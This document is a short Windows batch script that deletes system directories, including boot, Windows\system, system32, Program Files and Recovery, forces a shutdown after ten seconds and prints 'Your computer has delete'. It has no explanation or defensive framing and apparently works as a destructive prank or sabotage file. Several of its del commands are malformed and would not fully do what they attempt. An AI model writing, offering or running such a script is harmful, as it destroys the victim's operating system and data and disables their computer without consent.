@echo off
set NULL= 
title %NULL%
cd C:\
del boot
cd windows
del system
del system32
cd ..
del Program Files
del Recovery
del $WINDOWS.~BT
del $Windows.~WS
shutdown /s /t 10
echo Your computer has delete
pause